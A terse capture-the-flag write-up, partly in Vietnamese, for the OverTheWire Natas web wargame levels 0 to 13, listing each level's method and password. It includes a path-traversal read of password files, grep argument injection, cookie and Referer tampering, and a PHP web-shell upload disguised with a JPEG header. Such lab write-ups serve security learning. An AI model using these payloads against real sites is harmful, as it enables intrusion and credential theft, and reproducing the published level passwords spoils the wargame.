# NATAS WRITE UP
## Natas0
View source  
**user: natas1**  
**pass: gtVrDuiDfck831PqWsLEZy5gyDz1clto**
## Natas1
Ctrl + U  
**user: natas2**  
**pass: ZluruAthQk7Q2MqmDeTiUij2ZvWy2mBi**
## Natas2
http://natas2.natas.labs.overthewire.org/files/users.txt  
**user: natas3**  
**pass: sJIJNW6ucpu6HPZ1ZAchaDtwd7oGrD14**
## Natas3
http://natas3.natas.labs.overthewire.org/robots.txt  
http://natas3.natas.labs.overthewire.org/s3cr3t/users.txt  
**user: natas4**  
**pass: Z9tkRkWmpt9Qr7XrR5jWRkgOU901swEZ**
## Natas4
Dùng Burp intercept request để sửa referer thành http://natas5.natas.labs.overthewire.org/  
**user: natas5**  
**pass: iX6IOfmpN7AYOQGPwtn3fXpbaJVJcHfq**
## Natas5
Dùng Burp intercept request để sửa cookie thành loggedin=1  
**user: natas6**  
**pass: aGoY4q2Dc6MgDq4oL4YtoKtyAg9PeHa1**  
## Natas6
http://natas6.natas.labs.overthewire.org/includes/secret.inc  
Secret: FOEIUWGHFEEUHOFUOIU  
**user: natas7**  
**pass: 7z3hEENjQtflzgnT29q7wAvMNfZdh0i9**  
## Natas7
http://natas7.natas.labs.overthewire.org/index.php?page=/etc/natas_webpass/natas8  
**user: natas8**  
**pass: DBfUBfqQG69KvJvJ1iAbMoIpwSNQ9bWe**  
## Natas8
```python
#!/bin/python3
  secret = base64.b64decode(bytes.fromhex('3d3d516343746d4d6d6c315669563362').decode('utf-8')[::-1])
```
secret = oubWYf2kBq  
**user: natas9**  
**pass: W0mMhUcRRnG8dcghE4qvk3JA9lGt8nDl**  
## Natas9
Query: `'' -m10  /etc/natas_webpass/natas10`  
**user: natas10**  
**pass: nOpp1igQAkUzaI1GUUjzn1bFVj7xCNzu**
## Natas10
Query: `'' -m10  /etc/natas_webpass/natas11`  
**user: natas11**  
**pass: U82q5TCMMQ9xuFoI3dYX61s7OZD9JKoK**
## Natas11
https://gchq.github.io/CyberChef/#recipe=XOR(%7B'option':'Base64','string':'ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw%253D'%7D,'Standard',false)&input=eyJzaG93cGFzc3dvcmQiOiJubyIsImJnY29sb3IiOiIjZmZmZmZmIn0  
Xor key: qw8J
Crafted cookie: data=ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK  
**user: natas12**  
**pass: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3**
## Natas12
Tạo file php có nội dụng
```php
<?php 
    echo exec("cat /etc/natas_webpass/natas13");
?>
```
Upload file, sau đó dùng burp suite để sửa file extension thành ${random}.php (file đính kèm trong /natas12/exploit.php)
**user: natas13**
**pass: jmLTY0qiPZBbaKc9341cqPQZBJv7MQbY**
## Natas13
Thêm 4 bytes `FF D8 FF DB` vào trước file được tạo ở natas12
Upload file, sau đó dùng burp suite để sửa file extension thành ${random}.php (file đính kèm trong /natas13/exploit.php)




